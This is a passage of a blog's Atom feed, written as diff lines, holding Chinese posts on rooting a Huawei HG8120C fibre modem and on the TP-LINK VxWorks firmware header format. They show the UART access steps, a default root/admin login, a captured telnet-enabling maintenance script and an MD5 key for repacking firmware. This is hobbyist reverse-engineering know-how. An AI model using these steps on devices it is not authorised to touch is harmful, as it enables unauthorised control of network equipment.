+      <link href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html"/>
+      <id>https://blog.leexiaolan.tk/entry/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2</id>
+      <title>PWN华为HG8120C光猫（二）</title>
+      <content type="html"><![CDATA[
+      &lt;p&gt;&lt;a href=&quot;/pwn-huawei-hg8120c-ont-via-uart-part-1.html&quot; title=&quot;PWN华为HG8120C光猫（一）&quot;&gt;上一篇博文&lt;/a&gt;中，由于厂商采取了一定的安全预防措施，试图通过UART来PWN ONT HG8120C的尝试出人意料的失败了，但是这并不能摧毁我不达目的不罢休的决心，又尝试了多种方法，还是未能成功。难道非得使用直接读写Flash芯片（这种方法风险较大，可能损坏设备。同时设备也不能用，会断网，家里人会很生气，后果很严重。所以在还有其它可能的情况下，是不会轻易使用这种方法的。）这个终极法宝了？几乎绝望之际，想起来网上流传的厂商&lt;a href=&quot;https://www.google.com/search?source=xiaolan.lee&amp;amp;q=维修使能+华为&quot; title=&quot;Google搜索&quot;&gt;维护使能工具&lt;/a&gt;，又燃起了一丝希望。&lt;/p&gt;
+&lt;h1&gt;维护使能工具能做什么&lt;/h1&gt;
+&lt;p&gt;该工具用于厂商售后，所谓使能，就是开启设备的维护模式，并关闭防火墙对telnet 23端口的访问限制。使能后，telnet终端能够完成的设备维护的全部操作（UART得到的命令行其实就是这个telnet终端），但对于我的目的，得到root shell并运行&lt;code&gt;tcpdump&lt;/code&gt;来说，毫无用处。所以，引起我兴趣的不是使能后能做什么，而是使能工具如何和设备交互，发出使能命令的，说不定也能发出其它命令，比如就像我期望的&lt;code&gt;tcpdump&lt;/code&gt;。&lt;/p&gt;
+&lt;h1&gt;维护使能工具的工作原理&lt;/h1&gt;
+&lt;p&gt;该工具是运行的Windows上的一个可执行文件，想了解其工作原理，有两个办法：一是对exe进行逆向工程，二是抓包分析其发送的数据（其实不能算分析，纯粹瞎猜各个字节的意义，然后小心求证罢了）。使用dumpbin查看exe文件：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    D:\tmp&amp;gt;dumpbin /summary ONT.exe
+    Microsoft (R) COFF Binary File Dumper Version 6.00.8447
+    Copyright (C) Microsoft Corp 1992-1998. All rights reserved.
+
+    Dump of file D:\tmp\ONT.exe
+
+    File Type: EXECUTABLE IMAGE
+
+      Summary
+
+            2000 .text
+            2000 HWB8zP1w
+            1000 LEXmTy1n
+          216000 QrVbjeUa
+          20E000 lS8TSGXu
+           29000 niBTgJWZ
+            1000 sfW0L9wz
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;从section name来看，应该加过壳，逆向工程难度未知，那就试试抓包吧。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    11:26:03.559243 IP 192.168.1.2.819 &amp;gt; 255.255.255.255.6877: UDP, length 244
+    11:26:03.568366 IP 192.168.1.2.918 &amp;gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.770581 IP 192.168.1.2.918 &amp;gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.771255 IP 192.168.1.2.918 &amp;gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.803305 IP 192.168.1.2.918 &amp;gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.805057 IP 192.168.1.2.918 &amp;gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.805933 IP 192.168.1.2.918 &amp;gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.836141 IP 192.168.1.2.918 &amp;gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.836869 IP 192.168.1.2.918 &amp;gt; 224.0.0.99.4891: UDP, length 1220
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在第一个广播包中，发现了&lt;code&gt;224.0.0.99&lt;/code&gt;和&lt;code&gt;4891&lt;/code&gt;，于是猜测第一个UDP广播包是敲门砖，告诉设备后续数据包的目的IP和端口，其中还包括了后续数据包的个数和大小。后面的数据包就更简单了，几个固定值，包序号，数据长度，&lt;code&gt;\0&lt;/code&gt;填充和数据。为了克服UDP丢包问题，每个数据包都进行了多次重传。有了这些信息，很容易就可以从抓包的数据中，拼凑出完整的payload（其实，使能工具运行起来后，壳已经将数据解压，抓取其内存镜像，就能从中获取到完整的payload，只是不好确定payload和其它数据的边界而已）。有了payload后，对其使用常用的CRC16，CRC32，MD5，SHA-1等摘要算法，马上就发现了广播包中也包含也payload的CRC32信息。&lt;/p&gt;
+&lt;p&gt;将完整的payload保存为payload.bin，使用strings查看：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    leexiaolan@localhost $ strings payload.bin
+    HWNP
+    120|130|140|141|150|160|170|171|180|190|1B1|1A1|1A0|1B0|1D0|1F1|201|211|221|230|240|260|261|270|271|280|281|291|2A1|431|
+    file:/var/UpgradeCheck.xml
+    UPGRDCHECK
+    file:/mnt/jffs2/equipment.tar.gz
+    MODULE
+    file:/mnt/jffs2/ProductLineMode
+    UNKNOWN
+    file:/mnt/jffs2/TelnetEnable
+    UNKNOWN
+    file:/tmp/duit9rr.sh
+    UNKNOWN
+    file:/var/efs
+    ...
+    poo2
+    #! /bin/sh
+    var_etc_version_file=&quot;/etc/version&quot;
+    var_etc_version=&quot;&quot;
+    var_version_1=&quot;V100R006C00SPC130&quot;
+    var_version_2=&quot;V200R006C00SPC130&quot;
+    var_version_3=&quot;V300R013C00SPC106&quot;
+    var_version_4=&quot;V300R013C10SPC108&quot;
+    var_etc_version_V=&quot;&quot;
+    var_etc_version_R=&quot;&quot;
+    ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;有趣的东西终于出现了，看起来有个像shell脚本的字符串。仔细深入查看发现：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    #设置打开telnet的控制节点
+    HW_Open_Telnet_Ctree_Node()
+    {
+        var_node_telnet=InternetGatewayDevice.X_HW_Security.AclServices
+
+        #set telnet
+        EnableLanTelnetValue=&quot;1&quot;
+        cp -f $var_jffs2_current_ctree_file $var_current_ctree_bak_file
+        $var_pack_temp_dir/aescrypt2 1 $var_current_ctree_bak_file $var_current_ctree_file_tmp
+        mv $var_current_ctree_bak_file $var_current_ctree_bak_file&quot;.gz&quot;
+        gunzip -f $var_current_ctree_bak_file&quot;.gz&quot;
+
+        #set TELNETLanEnable
+        cfgtool set $var_current_ctree_bak_file $var_node_telnet TELNETLanEnable $EnableLanTelnetValue
+        if [ 0 -ne $? ]
+        then
+            echo &quot;ERROR::Failed to set TELNETLanEnable!&quot;
+        fi
+
+        #encrypt var_default_ctree
+        gzip -f $var_current_ctree_bak_file
+        mv $var_current_ctree_bak_file&quot;.gz&quot; $var_current_ctree_bak_file
+        $var_pack_temp_dir/aescrypt2 0 $var_current_ctree_bak_file $var_current_ctree_file_tmp
+        rm -f $var_jffs2_current_ctree_file
+        cp -f $var_current_ctree_bak_file $var_jffs2_current_ctree_file
+        return 0
+    }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;原来是给ONT设备发送了一个shell脚本来开启telnet。嗯，这看起来很像我要的执行任意代码的入口。&lt;/p&gt;
+&lt;h1&gt;转机&lt;/h1&gt;
+&lt;p&gt;如果能继续把payload的文件结构分析（瞎猜）清楚，就能修改payload中的脚本，运行我自己的代码了。至于如何发送修改过后的payload，这个大可不必自己写个程序来实现维护使能工具那套逻辑，使用原始工具使能telnet后，通过telnet终端使用&lt;code&gt;load pack&lt;/code&gt;命令从&lt;code&gt;FTP&lt;/code&gt;或&lt;code&gt;TFTP&lt;/code&gt;加载payload即可。还有另一个好处就是，维护使能工具必须在未接入运营商网络的情况下使用，而&lt;code&gt;load pack&lt;/code&gt;没有这个限制。离目标PWN越来越近了，后篇将分析payload结构，并修改和运行我自己的payload。&lt;/p&gt;
+&lt;p&gt;PS: 上述信息经过华为PSIRT确认，不会对用户或网络带来风险。&lt;/p&gt;
+
+      
+                <h4>相关阅读：</h4>
+                  <ul>
+                
+                  <li><a href="https://blog.leexiaolan.tk/arm-gcc-v4.4.7-bug-when-compile-openvpn-for-hg8120c-ont.html">编译 OpenVPN 邂逅 ARM GCC bug</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/compile-kernel-module-for-hg8120c-without-source-and-config.html">无 kernel 源代码和 config 的情况下为 HG8120C 编译内核模块</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html">PWN华为HG8120C光猫之后</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html">HG8120C持久root shell及完美解决IPv6丢包</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-uart-part-1.html">PWN华为HG8120C光猫（一）</a></li>
+                
+                </ul>
+                
+                <p>本文网址:<a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html">https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html</a></p>
+
+      ]]></content>
+      <author>
+          <name>李晓岚</name>
+      </author>
+      <updated>2016-05-20T11:15:30Z</updated>
+  </entry>
+
+  <entry>
+      <link href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-uart-part-1.html"/>
+      <id>https://blog.leexiaolan.tk/entry/pwn-huawei-hg8120c-ont-via-uart-part-1</id>
+      <title>PWN华为HG8120C光猫（一）</title>
+      <content type="html"><![CDATA[
+      &lt;p&gt;几星期前，家里网络更换了光猫(ONT)，由HG8120R换成了HG8120C，均系华为生产，ISP提供。事后发现原来完美工作的IPv6-in-IPv4 tunnel丢包严重，达到90%以上。由于ONT是唯一变更了的设备，所以可以几乎100%确认是新的ONT HG8120C造成的丢包。于是在过去的几个星期里，PWN新ONT设备便成了我闲暇时光的主要工作，最终成功pwned，获取了root shell。&lt;/p&gt;
+&lt;h1&gt;起因&lt;/h1&gt;
+&lt;p&gt;更换设备后，很快发现访问IPv6出现困难，完全不能打开网页，马上使用&lt;code&gt;ping6&lt;/code&gt;进行诊断，得到了如下很有规律的结果：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    leexiaolan@localhost $ ping6 2001:4860:4860::8888
+    PING 2001:4860:4860::8888(2001:4860:4860::8888) 56 data bytes
+    64 bytes from 2001:4860:4860::8888: icmp_seq=1 ttl=56 time=416 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=17 ttl=56 time=419 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=33 ttl=56 time=415 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=49 ttl=56 time=423 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=65 ttl=56 time=427 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=80 ttl=56 time=426 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=96 ttl=56 time=358 ms
+    ^C
+    --- 2001:4860:4860::8888 ping statistics ---
+    97 packets transmitted, 7 received, 92% packet loss, time 96013ms
+    rtt min/avg/max/mdev = 358.180/412.373/427.908/22.604 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;从结果来看，链路中某个设备，每16个数据包会丢掉其中的15个，仅有一个通过，丢包率高达15/16=93.75%。得到这样的结果，考虑到tunnel server在香港，第一反应这个丢包的设备是GFW。于是换国内某云服务商的机器做tunnel server测试，&lt;code&gt;ping6&lt;/code&gt;的目标地址就是tunnel server自身的IPv6地址，也得到了类似结果，所以，GFW的嫌疑洗清了。&lt;/p&gt;
+&lt;h1&gt;猜测&lt;/h1&gt;
+&lt;p&gt;这时，刚换的ONT设备的嫌疑就陡然上升了。使用设备提供的&lt;code&gt;useradmin&lt;/code&gt;登录ONT的web管理页面，可以看到新ONT可以提供IPv6连接，但是没有启用，也无法手动配置。而IPv6这个功能在老ONT上是没有的，这进一步加大了新ONT丢弃IPv6包的嫌疑。但由于老ONT HG8120R已经被ISP回收，无法置换回去测试，所以还不能100%确定就是ONT设备丢包。即便ONT是我已知的链路中唯一更换的设备，但无法确定ISP的局端设备是否发生变化，所以需要更强的证据来佐证是新ONT丢的包。如果可以抓取到ONT光口发出去的数据包，就能&amp;hellip;&amp;hellip;，很不幸手上没有这样的设备，买个这样的设备估计也不会很便宜。所以，剩下唯一的途径就从ONT下手，在ONT内部抓取数据包。&lt;/p&gt;
+&lt;p&gt;之前老的ONT已经PWNED，知道设备运行Linux kernel，Hisilicon（其母公司是华为）的ARM CPU。要在这样的设备上抓包，需要两个条件：一是抓包软件，二是root shell。第一个条件容易满足，交叉编译ARM处理器的tcpdump即可，我之前已经为HG8120R静态链接编译了tcpdump，应该可以直接使用，就差root shell了。&lt;/p&gt;
+&lt;h1&gt;UART&lt;/h1&gt;
+&lt;p&gt;以往的经验告诉我，这样的设备都有一个UART debug port，焊上对应信号线，root shell马上就有了，就像给机柜中的服务器插上显示器和键盘。只是这种方法需要拆开设备外壳包装，在电路板上找到对应针脚。一番观察之后，确定HG8120C外壳只用一颗螺丝和机壳周围一圈多个卡口固定。尽量不弄坏卡口，同时也保护好外观，小心翼翼地拆开机器外壳，取出电路板，马上就发现下图的五个针脚焊盘J4：&lt;/p&gt;
+&lt;p&gt;&lt;img title=&quot;HG8120C UART 针脚&quot; src=&quot;../media/ag5zfmJsb2ctbGVlLWhyZHIOCxIFTWVkaWEY8t_AAQw/hg8120c-uart-pin.png&quot; alt=&quot;HG8120C UART pin&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;针脚定义与&lt;a href=&quot;http://jcjc-dev.com/2016/04/08/reversing-huawei-router-1-find-uart/&quot;&gt;Practical Reverse Engineering Part 1 - Hunting for Debug Ports&lt;/a&gt;中相同，唯一例外就是上图中红框标注的两个电阻R231和R232缺失，而这两个电阻刚好是1和5脚，也就是Rx和Tx与电路连接的唯一通路，焊上两个100欧电阻或直接将TTL线焊接在中间两个焊点上即可。&lt;/p&gt;
+&lt;h1&gt;连接，上电，启动&lt;/h1&gt;
+&lt;p&gt;焊接好三根信号线，和电脑上使用的USB转串口设备连接，剩下就只用确定几个协议参数了。多数情况下除了波特率，其它参数都是默认值。波特率通常也都是使用那几个知名的速率，挨个试一遍就可以找到了。我运气很好，第一次试用115200便对了，上电启动设备，屏幕上很快就滚过下面这些信息：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    leexiaolan@localhost $ sudo screen /dev/ttyUSB0 115200
+
+    HuaWei StartCode 2012.02 (R15C10 Apr 03 2015 - 01:24:45)
+
+    NAND:  NAND FLASH Enter Low Driver Mode
+    Nand(Hardware): 128 MiB
+    startcode select the uboot to load
+    the high RAM is :8080103c
+    startcode uboot boot count:71872272
+    use the main slave_param area from flash, the RAM data is not OK!!!
+    Use the UbootA to load first
+    Use the UbootA to load success
+
+    U-Boot 2010.03 (R15C10 Jun 29 2015 - 17:21:21)
+
+    DRAM:  128 MB
+    Boot From NAND flash
+    Chip Type is SD5116H
+    ...
+    waitForPADO: wait for PADO on wan3 10 sec.
+    profile close core dump
+    Press any key to get started
+
+    telnet port:23
+    Open device /dev/pts/2 OK!
+    Entering character mode
+    Escape character is &#39;^]&#39;.
+
+    Welcome Visiting Huawei Home Gateway
+    Copyright by Huawei Technologies Co., Ltd.
+
+    Login:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;提示输入用户名，尝试常见的几个用户名密码组合，最后用户名root，密码admin成功登录了。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Login:root
+    Password:
+    WAP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到了&lt;code&gt;WAP&amp;gt;&lt;/code&gt;提示符，输入&lt;code&gt;shell&lt;/code&gt;和&lt;code&gt;debugshell&lt;/code&gt;等命令都提示命令不存在。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    WAP&amp;gt;shell
+    ERROR::Command is not existed
+
+    WAP&amp;gt;debugshell
+    ERROR::Command is not existed
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Google一番后，原来是需要先使用&lt;code&gt;su&lt;/code&gt;进入特权模式，再使用&lt;code&gt;shell&lt;/code&gt;命令。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    WAP&amp;gt;su
+    success!
+    SU_WAP&amp;gt;shell
+
+    BusyBox v1.18.4 (2015-06-27 14:02:58 CST) built-in shell (ash)
+    Enter &#39;help&#39; for a list of built-in commands.
+
+    profile close core dump
+    WAP(Dopra Linux) #
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;嗯，看到熟悉的BusyBox了，心中一阵喜悦。可惜这段喜悦没能延续很长时间，尝试输入两个命令后就彻底绝望了。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    WAP(Dopra Linux) # ls
+    /bin/sh: wap.ls: not found
+    WAP(Dopra Linux) # ps
+    ERROR::Command is not existed
+
+    WAP(Dopra Linux) # help
+    ERROR::Command is not existed
+
+    WAP(Dopra Linux) # ?
+    boardtype.sh
+    clcmcheck.sh
+    customize.sh
+    EquipMode.sh
+    exit
+    getcustominfo.sh
+    getcustomize.sh
+    ifconfig
+    iwconfig
+    ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;BusyBox是假的，还是只能执行几个有限的命令。失望之余，只能寄希望于看能不能在这三个&lt;code&gt;WAP&amp;gt;&lt;/code&gt;，&lt;code&gt;SU_WAP&amp;gt;&lt;/code&gt;和&lt;code&gt;WAP(Dopra Linux) #&lt;/code&gt;提示符下找到任何一个可以利用的命令，于是开始了一个无聊的循环，一个命令一个命令的尝试，了解其作用，最后得出令人心塞的结论：全军覆没，没有一个可以用于执行任意代码。&lt;/p&gt;
+&lt;h1&gt;如何继续&lt;/h1&gt;
+&lt;p&gt;到目前为止，厂商的安全措施做得还不错，还没有发现明显可以利用的漏洞。那么，下一步该如何进行呢？仔细思考了一会，大概还有如下几个途径：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用jTAG直接读写Flash。这种方法的不方便在于，需要处理系统本身的文件系统数据结构以及uboot对数据的校验等信息。另外，jTAG针脚比UART多，电路板上也没有明显标记，在没有CPU的数据手册情况下，很难确定针脚定义。&lt;/li&gt;
+&lt;li&gt;使用Flash编程器在线或焊下芯片离线读写Flash。这种操作Flash的方式更困难，还需要考虑&lt;a href=&quot;http://community.hpe.com/t5/Security-Research/Reverse-engineering-NAND-Flash-for-fun-and-profit/ba-p/6418140&quot;&gt;Flash的OOB数据&lt;/a&gt;。&lt;/li&gt;
+&lt;li&gt;如何中断uboot，得到uboot cli，从而修改Flash或从网络加载kernel等。&lt;/li&gt;
+&lt;li&gt;找Web管理页面或命令行参数注入漏洞。&lt;/li&gt;
+&lt;li&gt;修改firmware升级包，&lt;code&gt;WAP&amp;gt;&lt;/code&gt;提示符下使用&lt;code&gt;load pack&lt;/code&gt;升级。&lt;/li&gt;
+&lt;li&gt;厂商隐藏的其它后门。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;可能还存在某些目前还未想到的方法。总之，可以尝试的方法还很多，肯定能找到行之有效方法。下篇再继续我们的PWN HG8120C之旅。&lt;/p&gt;
+      
+                <h4>相关阅读：</h4>
+                  <ul>
+                
+                  <li><a href="https://blog.leexiaolan.tk/arm-gcc-v4.4.7-bug-when-compile-openvpn-for-hg8120c-ont.html">编译 OpenVPN 邂逅 ARM GCC bug</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/compile-kernel-module-for-hg8120c-without-source-and-config.html">无 kernel 源代码和 config 的情况下为 HG8120C 编译内核模块</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html">PWN华为HG8120C光猫之后</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html">PWN华为HG8120C光猫（二）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html">HG8120C持久root shell及完美解决IPv6丢包</a></li>
+                
+                </ul>
+                
+                <p>本文网址:<a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-uart-part-1.html">https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-uart-part-1.html</a></p>
+
+      ]]></content>
+      <author>
+          <name>李晓岚</name>
+      </author>
+      <updated>2016-04-30T17:30:49Z</updated>
+  </entry>
+
+  <entry>
+      <link href="https://blog.leexiaolan.tk/tp-link-vxworks-router-firmware-update-file-format-part-3.html"/>
+      <id>https://blog.leexiaolan.tk/entry/tp-link-vxworks-router-firmware-update-file-format-part-3</id>
+      <title>TP-LINK VxWorks系统路由器固件升级文件格式(三)</title>
+      <content type="html"><![CDATA[
+      &lt;p&gt;在&lt;a href=&quot;/tp-link-vxworks-router-firmware-update-file-format-part-1.html&quot;&gt;TP-LINK VxWorks系统路由器固件升级文件格式(一)&lt;/a&gt;中，经过一定的逻辑推理分析，虽然分辨出了固件升级文件中的有效载荷部分，但这种方法对偏移&lt;code&gt;0x00-0x5c&lt;/code&gt;的文件头信息却无能为力。想要知道这部分头信息的确切含义，只能依靠分析反汇编代码。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;loc_800D9468:                            # CODE XREF: sysmgr_lib_fwupMain+38j
+                lw      $v0, 0($a0)             # &amp;lt;------------ file size
+                beq     $v0, $a1, loc_800D9490
+                lui     $a1, 0x806E
+                la      $a0, aErrorS05dFileS  # &quot;[Error](%s) %05d: file-size section is &quot;...
+                la      $a1, aSysmgr_lib_f_1  # &quot;sysmgr_lib_fwupcheckHeader&quot;
+                jal     printf
+                li      $a2, 0x93
+                j       loc_800D942C
+                li      $s1, 0xFFFFFFFE
+ # ---------------------------------------------------------------------------
+
+loc_800D9490:                            # CODE XREF: sysmgr_lib_fwupMain+9Cj
+                addiu   $s0, $a0, 4            # &amp;lt;------------ md5 hash
+                addiu   $s2, $sp, 0x270+var_250
+                move    $a1, $s0
+                li      $a2, 0x10
+                jal     memcpy
+                move    $a0, $s2
+                lui     $a1, 0x8089
+                move    $a0, $s0
+                la      $a1, md5key            # &amp;lt;------------ md5 initial vector
+                li      $a2, 0x10
+                jal     memcpy
+                addiu   $s1, $sp, 0x270+var_240
+                move    $a1, $s0
+                addiu   $a2, $s3, -4
+                jal     md5_calc
+                move    $a0, $s1
+                move    $a0, $s2
+                move    $a1, $s1
+                jal     memcmp
+                li      $a2, 0x10
+                beqz    $v0, loc_800D9504
+                lui     $a0, 0x807E
+                lui     $a1, 0x806E
+                la      $a0, aErrorS05dMd5Ch  # &quot;[Error](%s) %05d: md5 checksum is not c&quot;...
+                la      $a1, aSysmgr_lib_f_1  # &quot;sysmgr_lib_fwupcheckHeader&quot;
+                jal     printf
+                li      $a2, 0xB8
+                j       loc_800D942C
+                li      $s1, 0xFFFFFFFE
+ # ---------------------------------------------------------------------------
+
+loc_800D9504:                            # CODE XREF: sysmgr_lib_fwupMain+110j
+                jal     sysmgr_cfg_getProductInfoFromNvram
+                addiu   $a0, $sp, 0x270+var_230
+                bltz    $v0, loc_800D9548
+                addiu   $a0, $sp, 0x270+var_210
+                addiu   $a1, $s4, 0x14          # &amp;lt;----------- vendor name
+                jal     memcmp
+                li      $a2, 0x40
+                beqz    $v0, loc_800D9568
+                addiu   $a0, $sp, 0x270+var_1B0
+                lui     $a0, 0x807E
+                lui     $a1, 0x806E
+                la      $a0, aErrorS05dVendo  # &quot;[Error](%s) %05d: vendor full name is n&quot;...
+                la      $a1, aSysmgr_lib_f_1  # &quot;sysmgr_lib_fwupcheckHeader&quot;
+                jal     printf
+                li      $a2, 0xC7
+                j       loc_800D942C
+                li      $s1, 0xFFFFFFFD
+ # ---------------------------------------------------------------------------
+
+loc_800D9548:                            # CODE XREF: sysmgr_lib_fwupMain+13Cj
+                lui     $a0, 0x807E
+                lui     $a1, 0x806E
+                la      $a0, aErrorS05dGet_7  # &quot;[Error](%s) %05d: get productInfo faile&quot;...
+                la      $a1, aSysmgr_lib_f_1  # &quot;sysmgr_lib_fwupcheckHeader&quot;
+                jal     printf
+                li      $a2, 0xBF
+                j       loc_800D942C
+                li      $s1, 0xFFFFFFFE
+ # ---------------------------------------------------------------------------
+
+loc_800D9568:                            # CODE XREF: sysmgr_lib_fwupMain+150j
+                addiu   $a1, $s4, 0x54          # &amp;lt;---------- model id
+                jal     memcmp
+                li      $a2, 8
+                beqz    $v0, loc_800D959C
+                addiu   $s0, $s4, 0x5C
+                lui     $a0, 0x807E
+                lui     $a1, 0x806E
+                la      $a0, aErrorS05dModel  # &quot;[Error](%s) %05d: model Id is not corre&quot;...
+                la      $a1, aSysmgr_lib_f_1  # &quot;sysmgr_lib_fwupcheckHeader&quot;
+                jal     printf
+                li      $a2, 0xCF
+                j       loc_800D942C
+                li      $s1, 0xFFFFFFFD
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这段汇编代码比较简单，很容易看出开始的四个字节是大端&lt;code&gt;uint32&lt;/code&gt;类型，指出整个升级文件的大小。接下来16个字节是文件的MD5校验值。再接下来的64个字节制造商的名字。最后的八个字节是产品型号。&lt;/p&gt;
+&lt;p&gt;计算文件MD5校验值时，表示文件长度的头四个字节是不参与计算的。并且用&lt;code&gt;&#39;\x7a\x2b\x15\xed\x9b\x98\x59\x6d\xe5\x04\xab\x44\xac\x2a\x9f\x4e&#39;&lt;/code&gt;来填充MD5值占据的这16个字节，也可以看作是MD5 Hash的初始向量。&lt;/p&gt;
+&lt;p&gt;制造商的名字固定为64字节，不足使用&lt;code&gt;0x00&lt;/code&gt;填充。目前已知的取值为&lt;code&gt;&quot;TP-LINK_TECHNOLOGIES_CO.&quot;&lt;/code&gt;。而产品型号则顾名思义，不需要多余的解释。&lt;/p&gt;
+&lt;p&gt;于是，升级文件的头可以如下定义：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;struct FirmwareUpdateHeader{
+  uint32       fileSize;
+  uint8[0x10]  md5;
+  uint8[0x40]  vendorName;
+  uint8[0x08]  modelId;
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;有了上述信息和&lt;a href=&quot;/tp-link-vxworks-router-firmware-update-file-format-part-1.html&quot;&gt;部分（一）&lt;/a&gt;中分析，就可以将在&lt;a href=&quot;/tp-link-vxworks-router-firmware-update-file-format-part-1.html&quot;&gt;部分（一）&lt;/a&gt;中提取到的分区文件，重新打包成固件升级文件。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./fw pack -r DIR FILE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;DIR&lt;/code&gt;是各个分区文件所在目录，目录中不能包含其它多余文件。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;FILE&lt;/code&gt;是期望生成的固件升级文件名。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/LeeXiaolan/tplink-vxworks-based-firmware/blob/e87a1e2d3e973b7b8920d46252d222182aee0fa7/fw&quot;&gt;fw源代码&lt;/a&gt;，目前代码中仅包含WVR300V1的型号ID。&lt;/p&gt;
+&lt;p&gt;值得一提的是，名为&lt;code&gt;&quot;partition-table&quot;&lt;/code&gt;的分区，在升级文件中，必须位于第一位，其它分区对顺序不敏感。另外，位于偏移&lt;code&gt;0x5c&lt;/code&gt;的分区信息表的大小固定为&lt;code&gt;0x800&lt;/code&gt;。这一切都是由于下面这段代码决定的。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;             jal     nm_lib_parsePtnIndexFile
+             addiu   $a1, $s2, 0x804 # &amp;lt;--------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上述汇编代码，均来自于&lt;code&gt;os-image&lt;/code&gt;中，对&lt;code&gt;os-image&lt;/code&gt;进行加载内存地址定位，反汇编分析，即可知道其中大部分数据为&lt;code&gt;zlib&lt;/code&gt;压缩数据流，解压到特定地址后运行。解压后才是路由器实际运行的代码。&lt;a href=&quot;https://github.com/LeeXiaolan/tplink-vxworks-based-firmware/blob/e87a1e2d3e973b7b8920d46252d222182aee0fa7/uncompress-os-image.py&quot;&gt;uncompress-os-image.py&lt;/a&gt;可以用来从&lt;code&gt;os-image&lt;/code&gt;中定位压缩流并解压出实际代码。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./uncompress-os-image.py OS-IMAGE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;至此，固件升级文件中的重要部分都一一分析完成了。&lt;/p&gt;
+      
+                <h4>相关阅读：</h4>
+                  <ul>
+                
+                  <li><a href="https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html">PWN华为HG8120C光猫之后</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html">PWN华为HG8120C光猫（二）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-uart-part-1.html">PWN华为HG8120C光猫（一）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-upgrade-pack-format-part-3.html">PWN华为HG8120C光猫（三）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/tp-link-vxworks-router-firmware-update-file-format-part-2.html">TP-LINK VxWorks系统路由器固件升级文件格式(二)</a></li>
+                
+                </ul>
+                
+                <p>本文网址:<a href="https://blog.leexiaolan.tk/tp-link-vxworks-router-firmware-update-file-format-part-3.html">https://blog.leexiaolan.tk/tp-link-vxworks-router-firmware-update-file-format-part-3.html</a></p>
+
+      ]]></content>
+      <author>
+          <name>李晓岚</name>
+      </author>
